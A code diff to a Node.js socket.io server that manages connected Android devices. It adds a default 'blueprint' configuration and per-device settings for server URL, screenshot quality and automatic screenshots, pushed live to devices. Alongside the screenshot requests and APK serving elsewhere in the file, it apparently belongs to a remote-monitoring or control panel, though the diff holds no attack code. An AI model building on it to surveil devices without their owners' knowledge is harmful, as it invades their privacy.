@@ -6,6 +6,74 @@ import { exec } from 'child_process';
 import { db } from './db.js';
 
 const serverPort = 4000;
+
+// Initialize blueprint with default values if not exists
+async function initializeBlueprint() {
+    try {
+        const blueprint = await db.getBlueprint();
+        if (!blueprint) {
+            const defaultServerUrl = `https://android-portal.tunegociosmart.com.ar/android`;
+            await db.run(
+                'INSERT OR IGNORE INTO config_blueprint (id, server_url, screenshot_quality, auto_screenshot) VALUES (1, ?, ?, ?)',
+                defaultServerUrl, 70, 1
+            );
+            console.log(chalk.green('[+] Blueprint initialized with default values'));
+        }
+    } catch (error) {
+        console.error('Error initializing blueprint:', error);
+    }
+}
+
+// Generate device config from blueprint
+async function generateDeviceConfig(deviceUuid) {
+    try {
+        // Check if config already exists for this device
+        let deviceConfig = await db.getDeviceConfig(deviceUuid);
+        
+        if (deviceConfig) {
+            // If exists, return existing config
+            return {
+                server_url: deviceConfig.server_url,
+                screenshot_quality: deviceConfig.screenshot_quality,
+                auto_screenshot: deviceConfig.auto_screenshot === 1
+            };
+        }
+        
+        // If not exists, generate from blueprint
+        const blueprint = await db.getBlueprint();
+        if (!blueprint) {
+            throw new Error('Blueprint not found');
+        }
+        
+        // Save new config to DB
+        await db.upsertDeviceConfig(
+            deviceUuid,
+            blueprint.server_url,
+            blueprint.screenshot_quality,
+            blueprint.auto_screenshot,
+            0 // is_custom = 0 (from blueprint)
+        );
+        
+        console.log(chalk.blue(`[i] Generated config for device ${deviceUuid} from blueprint`));
+        
+        return {
+            server_url: blueprint.server_url,
+            screenshot_quality: blueprint.screenshot_quality,
+            auto_screenshot: blueprint.auto_screenshot === 1
+        };
+    } catch (error) {
+        console.error('Error generating device config:', error);
+        // Fallback to default config
+        return {
+            server_url: 'https://android-portal.tunegociosmart.com.ar/android',
+            screenshot_quality: 70,
+            auto_screenshot: true
+        };
+    }
+}
+
+// Call initializeBlueprint after DB is ready
+initializeBlueprint();
 const devices = new Map(); // Map<device_uuid, {info: data, socket: socket}>
 const pendingScreenshots = new Map(); // Map<device_uuid, {frontend_socket_id, timestamp}>
 const pendingScreenshotResponses = new Map(); // Map<device_uuid, timeout>
@@ -147,15 +215,10 @@ androidIo.on("connection", async (socket) => {
 
         console.log(chalk.green(`[+] Android device Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
 
-        const androidNamespace = '/android';
-        // TODO: Send actual config from DB or use default from portal
-        const defaultConfig = {
-            server_url: 'https://android-portal.tunegociosmart.com.ar' + androidNamespace,
-            screenshot_quality: 70,
-            auto_screenshot: true
-        };
-        socket.emit("config_data", defaultConfig);
-        console.log(chalk.blue(`[i] Sent default config to device ${deviceUuid}:`, JSON.stringify(defaultConfig)));
+        // Generate config for this device from blueprint
+        const deviceConfig = await generateDeviceConfig(deviceUuid);
+        socket.emit("config_data", deviceConfig);
+        console.log(chalk.blue(`[i] Sent config to device ${deviceUuid}:`, JSON.stringify(deviceConfig)));
 
         // Broadcast updated device list to frontend
         const deviceList = Array.from(devices.values()).map((d) => ({
@@ -558,6 +621,146 @@ frontendIo.on("connection", async (socket) => {
         } catch (error) {
             console.error(`Error reading APK: ${error.message}`);
             socket.emit("apk_error", { error: "APK not found or build not completed" });
+        }
+    });
+
+    // Blueprint events
+    socket.on("get_blueprint", async () => {
+        try {
+            const blueprint = await db.getBlueprint();
+            socket.emit("blueprint_data", blueprint || {
+                server_url: 'https://android-portal.tunegociosmart.com.ar/android',
+                screenshot_quality: 70,
+                auto_screenshot: 1
+            });
+        } catch (error) {
+            console.error('Error getting blueprint:', error);
+            socket.emit("blueprint_error", { error: error.message });
+        }
+    });
+
+    socket.on("update_blueprint", async (data) => {
+        try {
+            const { server_url, screenshot_quality, auto_screenshot } = data;
+            
+            // Validations
+            if (!server_url || typeof server_url !== 'string') {
+                throw new Error('Invalid server_url');
+            }
+            if (screenshot_quality < 1 || screenshot_quality > 100) {
+                throw new Error('screenshot_quality must be between 1 and 100');
+            }
+            
+            await db.updateBlueprint(server_url, screenshot_quality, auto_screenshot);
+            
+            console.log(chalk.green(`[+] Blueprint updated by frontend ${socket.id}`));
+            socket.emit("blueprint_updated", { success: true });
+            
+            // Notify all frontends
+            frontendIo.emit("blueprint_changed", {
+                server_url,
+                screenshot_quality,
+                auto_screenshot
+            });
+        } catch (error) {
+            console.error('Error updating blueprint:', error);
+            socket.emit("blueprint_error", { error: error.message });
+        }
+    });
+
+    // Device config events
+    socket.on("get_device_config", async (deviceUuid) => {
+        try {
+            const config = await db.getDeviceConfig(deviceUuid);
+            if (config) {
+                socket.emit("device_config_data", {
+                    device_uuid: deviceUuid,
+                    ...config,
+                    auto_screenshot: config.auto_screenshot === 1
+                });
+            } else {
+                // If not exists, generate from blueprint
+                const generatedConfig = await generateDeviceConfig(deviceUuid);
+                socket.emit("device_config_data", {
+                    device_uuid: deviceUuid,
+                    ...generatedConfig,
+                    is_custom: 0
+                });
+            }
+        } catch (error) {
+            console.error('Error getting device config:', error);
+            socket.emit("device_config_error", { error: error.message });
+        }
+    });
+
+    socket.on("update_device_config", async (data) => {
+        try {
+            const { device_uuid, server_url, screenshot_quality, auto_screenshot } = data;
+            
+            // Validations
+            if (!device_uuid) {
+                throw new Error('device_uuid is required');
+            }
+            if (!server_url || typeof server_url !== 'string') {
+                throw new Error('Invalid server_url');
+            }
+            if (screenshot_quality < 1 || screenshot_quality > 100) {
+                throw new Error('screenshot_quality must be between 1 and 100');
+            }
+            
+            // Update config in DB
+            await db.upsertDeviceConfig(
+                device_uuid,
+                server_url,
+                screenshot_quality,
+                auto_screenshot,
+                1 // is_custom = 1 (manually modified)
+            );
+            
+            console.log(chalk.green(`[+] Config updated for device ${device_uuid} by frontend ${socket.id}`));
+            socket.emit("device_config_updated", { success: true, device_uuid });
+            
+            // If device is connected, send new config
+            const device = devices.get(device_uuid);
+            if (device && device.socket) {
+                const newConfig = {
+                    server_url,
+                    screenshot_quality,
+                    auto_screenshot
+                };
+                device.socket.emit("config_data", newConfig);
+                console.log(chalk.blue(`[i] Sent updated config to device ${device_uuid}`));
+            }
+        } catch (error) {
+            console.error('Error updating device config:', error);
+            socket.emit("device_config_error", { error: error.message });
+        }
+    });
+
+    socket.on("reset_device_config", async (deviceUuid) => {
+        try {
+            if (!deviceUuid) {
+                throw new Error('device_uuid is required');
+            }
+            
+            // Delete custom config
+            await db.deleteDeviceConfig(deviceUuid);
+            
+            // Regenerate from blueprint
+            const newConfig = await generateDeviceConfig(deviceUuid);
+            
+            console.log(chalk.green(`[+] Config reset to blueprint for device ${deviceUuid}`));
+            socket.emit("device_config_reset", { success: true, device_uuid: deviceUuid });
+            
+            // If device is connected, send new config
+            const device = devices.get(deviceUuid);
+            if (device && device.socket) {
+                device.socket.emit("config_data", newConfig);
+                console.log(chalk.blue(`[i] Sent reset config to device ${deviceUuid}`));
+            }
+        } catch (error) {
+            console.error('Error resetting device config:', error);
+            socket.emit("device_config_error", { error: error.message });
         }
     });
 
